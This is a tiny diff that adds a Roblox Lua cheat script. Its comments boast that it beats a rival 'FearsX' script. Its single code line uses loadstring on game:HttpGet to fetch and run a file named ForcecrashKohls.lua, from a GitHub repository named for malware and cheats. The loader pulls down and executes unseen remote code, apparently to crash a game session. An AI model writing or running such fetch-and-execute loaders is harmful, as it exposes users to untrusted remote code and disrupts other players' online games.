@@ -1,0 +1,4 @@
+--It's much better than the FearsX script because the likelyhood of it missing is much smaller.
+--It doesn't work if the regen pad has been moved so keep that in mind
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/M4lw4reT3sts/scripts-cheats-2/main/ForcecrashKohls.lua'),true))()
